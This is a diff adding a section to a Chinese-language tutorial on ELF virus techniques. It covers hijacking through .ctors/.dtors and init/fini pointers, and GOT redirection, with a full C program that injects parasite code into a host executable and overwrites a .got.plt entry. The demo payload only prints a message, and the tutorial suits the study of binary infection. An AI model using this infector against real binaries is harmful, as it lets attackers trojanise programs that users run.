@@ -5741,5 +5741,241 @@ int main(int argc, char *argv[])
 
 这里的原因是因为寄生代码通常会比较大，如果直接将寄生代码写到目标函数的代码区域，那么因为我们并不知道目标函数到底有多大，如果寄生代码越界到了别的函数，那么会造成无发预期的错误。
 
-#### 重写.ctors/dtors 指针
+#### 重写.ctors/.dtors 指针
+
+对于text段的控制流劫持方法基本可以分为直接PLT感染和函数蹦床两种方法，但是这里需要提出的是，一般宿主程序中还有两个特殊的函数。
+
+大多数可执行文件是通过链接libc进行编译的，因此gcc会将glibc的初始化代码和终止代码存放在编译好的可执行文件和共享库文件中。而对于可执行文件，在调用main()函数之前会调用存放在可执行文件中的glibc初始化代码，而在调用main()函数之后会调用存放在可执行文件中的glibc终止代码。
+
+在本人的实验环境中通过gdb调试发现，宿主程序在调用 main() 函数之前会调用 _init() 函数然后通过函数指针的方式调用 frame_dummy() 函数，main() 函数执行完成以后，会通过函数指针调用 __do_global_dtors_aux() 函数 然后调用 _fini() 函数。
+
+_init() 函数的代码位于代码段的.init 节，_fini() 函数的代码位于代码段 .fini节，frame_dummy() 函数的地址位于数据段的 .init_array 节，而 __do_global_dtors_aux() 函数的地址位于数据段的 .fini_array() 节。在宿主文件的动态段(PT_Dynamic)中保存了这些节的位置信息。
+
+因此，可以在_init() 函数或者 _fini() 函数中插入函数蹦床，使得寄生代码能够在程序其他部分执行之前或执行之后就执行，这样能够更加不易察觉。
+
+也可以重写位于 .init_array 节以及 .fini_array 节中的函数指针，这在后面的内容中会进行介绍。
+
+#### GOT 感染
+
+有时也被称为PLT/GOT 重定向(PLT/GOT redirection)，之前介绍动态链接时详细的介绍过GOT的原理，在GOT中存放了共享库函数真正的地址，这些地址需要在运行时才能解析出来，因此可执行文件中预留了GOT这块区域用于存放共享库函数的真正地址。
+
+注意到GOT就是.plt.got节，这个节位于数据段可以进行读写，因此，可以将GOT中的存放的地址重写为寄生代码的地址，从而使宿主程序在调用共享库函数时，会转而执行寄生代码，从而劫持到宿主程序的控制流。
+
+重写函数之前和前面所提到的程序控制流劫持方法的区别在于，可以直接将寄生代码的地址重写到函数指针所在的位置，而无需插入跳板代码。
+
+代码实现如下：
+
+##### GOT redirection
+
+```c
+/* got_redirection.c 
+ * overwrite the function pointers in GOT 
+ * to hijack the control flow of host.
+ * Usage: ./got_redirection <host_file>
+*/
+
+#include <stdio.h>
+#include <stdlib.h>
+#include <sys/mman.h>
+#include <errno.h>
+#include <unistd.h>
+#include <sys/stat.h>
+#include <stdint.h>
+#include <elf.h>
+#include <fcntl.h>
+#include <string.h>
+
+typedef struct _handle_t
+{
+    uint8_t *mem;
+    Elf64_Ehdr *ehdr;
+    Elf64_Phdr *phdr;
+    Elf64_Shdr *shdr;
+    char *shrtable;
+}handle_t;
+
+static volatile inline void 
+_write(int, char *, unsigned int)__attribute__((aligned(8), __always_inline__));
+
+static volatile inline void
+_write(int fd, char *buffer, unsigned int len)
+{
+    __asm__ volatile(
+        /* write(1, "[I'm in here]\n", 14) */
+        "mov %0, %%edi\n"
+        "mov %1, %%rsi\n"
+        "mov %2, %%edx\n"
+        "mov $1, %%rax\n"
+        "syscall\n"
+        
+        /* exit(0) */
+        "mov $0, %%edi\n"
+        "mov $60, %%rax\n"
+        "syscall\n"
+        : 
+        : "g"(fd), "g"(buffer), "g"(len)
+    );
+}
+
+void parasite_greeting()
+{
+    char str[] = {'[', 'I', '\'', 'm', 
+    ' ', 'i', 'n', ' ', 'h', 'e', 'r', 'e', ']','\n', '\0'};
+    _write(1, str, 14);
+    
+    /*
+    __asm__ volatile(
+        "mov $0x401178, %%rax\n"
+        "jmp *%%rax\n"
+        :
+        : 
+    );
+    */
+}
+
+uint8_t *create_shellcode(void (*fn)(),size_t len)
+{
+    int i;
+    uint8_t *mem = malloc(len);
+    uint8_t *ptr = (uint8_t *)fn;
+    for(i = 0; i < len; i++) mem[i] = ptr[i];
+    return mem;
+}
+
+uint64_t f1 = (uint64_t)parasite_greeting;
+uint64_t f2 = (uint64_t)create_shellcode;
+
+int main(int argc, char *argv[])
+{
+    if(argc < 2)
+    {
+        printf("Usage: %s <exec_file>\n", argv[0]);
+        exit(-1);
+    }
+    handle_t h;
+    size_t parasite_len = ((f2 - f1) + 7) & (~7);
+    uint8_t *parasite_code = create_shellcode(parasite_greeting, parasite_len);
+
+    char *file_name = strdup(argv[1]);
+    int fd;
+    if((fd = open(file_name, O_RDWR)) < 0)
+    {
+        perror("open");
+        exit(-1);
+    }
+    struct stat st;
+    if(fstat(fd, &st) < 0)
+    {
+        perror("fstat");
+        exit(-1);
+    }
+    h.mem = mmap(NULL, st.st_size, PROT_READ|PROT_WRITE, MAP_PRIVATE, fd, 0);
+    
+    if(h.mem == MAP_FAILED)
+    {
+        perror("mmap");
+        exit(-1);
+    }
+    
+    h.ehdr = (Elf64_Ehdr *)h.mem;
+    h.phdr = (Elf64_Phdr *)&h.mem[h.ehdr->e_phoff];
+    h.shdr = (Elf64_Shdr *)&h.mem[h.ehdr->e_shoff];
+    
+    Elf64_Off parasite_offset;
+    Elf64_Addr parasite_entry;
+    int i;
+    for(i = 0; i < h.ehdr->e_phnum; i++)
+    {
+        if((h.phdr[i].p_type == PT_LOAD) && (h.phdr[i].p_flags == PF_R + PF_X))
+        {
+            parasite_offset = h.phdr[i].p_offset + h.phdr[i].p_filesz; 
+            parasite_entry = h.phdr[i].p_vaddr + h.phdr[i].p_memsz;
+            h.phdr[i].p_filesz += parasite_len;
+            h.phdr[i].p_memsz += parasite_len;
+        }
+    }
+
+    h.shrtable = &h.mem[h.shdr[h.ehdr->e_shstrndx].sh_offset];
+    
+    size_t hijack_offset;
+
+    for(i = 0; i < h.ehdr->e_shnum; i++)
+    {
+        if(h.shdr[i].sh_offset + h.shdr[i].sh_size == parasite_offset)
+            h.shdr[i].sh_size += parasite_len;
+        if(strcmp(&h.shrtable[h.shdr[i].sh_name], ".got.plt") == 0)
+        {
+            hijack_offset = h.shdr[i].sh_offset + h.shdr[i].sh_entsize * 4;
+            printf("Got the .got.plt offset at %lx\n", hijack_offset);
+        }
+    }
+
+    if(lseek(fd, 0, SEEK_SET) < 0)
+    {
+        perror("lseek");
+        exit(-1);
+    }
+    if(write(fd, h.mem, sizeof(Elf64_Ehdr) + h.ehdr->e_phentsize * h.ehdr->e_phnum) < 0)
+    {
+        perror("write");
+        exit(-1);
+    }
+    if(lseek(fd, parasite_offset, SEEK_SET) < 0)
+    {
+        perror("lseek");
+        exit(-1);
+    }
+    if(write(fd, parasite_code, parasite_len) < 0)
+    {
+        perror("write");
+        exit(-1);
+    }
+    if(lseek(fd, hijack_offset, SEEK_SET) < 0)
+    {
+        perror("lseek");
+        exit(-1);
+    }
+    if(write(fd, &parasite_entry, 8) < 0)
+    {
+        perror("write");
+        exit(-1);
+    }
+    if(lseek(fd, h.ehdr->e_shoff, SEEK_SET) < 0)
+    {
+        perror("lseek");
+        exit(-1);
+    }
+    if(write(fd, h.shdr, h.ehdr->e_shentsize * h.ehdr->e_shnum) < 0)
+    {
+        perror("write");
+        exit(-1);
+    }
+    close(fd);
+    return 0;
+}
+```
+
+执行的结果如下图所示：
+
+![got_redirection_result](./image/got_redirection_result.png)
+
+同样，这里展示一下函数指针重写的结果，在重写GOT之前，宿主文件的GOT如下图所示：
+
+![got_redirection_before](./image/got_redirection_before.png)
+
+在重写GOT之前，GOT中存放的地址指向.plt节，在.plt节中代码会调用动态链接器来解析共享库函数运行时的地址，并将这个地址写回到GOT中。
+
+在重写了GOT之后，宿主程序的GOT如下图所示：
+
+![got_redirection_then](./image/got_redirection_then.png)
+
+在重写了GOT之后，GOT中存放的是寄生代码的地址，宿主程序通过共享库函数对应的plt条目进行间接跳转，直接跳转到GOT中存放的地址去执行，因此宿主程序会跳转到寄生代码区执行。
+
+GOT相当于一个函数指针的数组，所以GOT感染实际上也相当于是重写函数指针的感染方式，而除了GOT，在一个可执行文件的数据段中还有别的地方也用于存放函数指针，除了前面提到的 .init_array 节存放指向 fram_dummy() 函数的指针，以及 .fini_array 节中存放的指向 __do_global_dtors_aux() 函数的指针，位于数据段的 .got 节中还存放了 _libc_start_main_impl() 函数的地址，这个地址是在运行时解析的，所以在文件中可以看到这个节的内容为0。
+
+_start() 函数会首先调用 _libc_start_main_impl() 函数，然后 _libc_start_main_impl() 函数会先调用 _init() 函数和 frame_dummy() 函数，在调用 _libc_start_call_main() 函数，从而调用 main() 函数。
+
+如果想通过修改text段来劫持宿主程序的控制流，那么通常的做法是在text段中插入一段跳板代码(push $0x0, ret)来劫持控制流；如果想通过修改data段来劫持宿主程序的控制流，那么通常的做法是重写位于data段中的某个函数指针来劫持控制流。
+
+### 代码注入
 
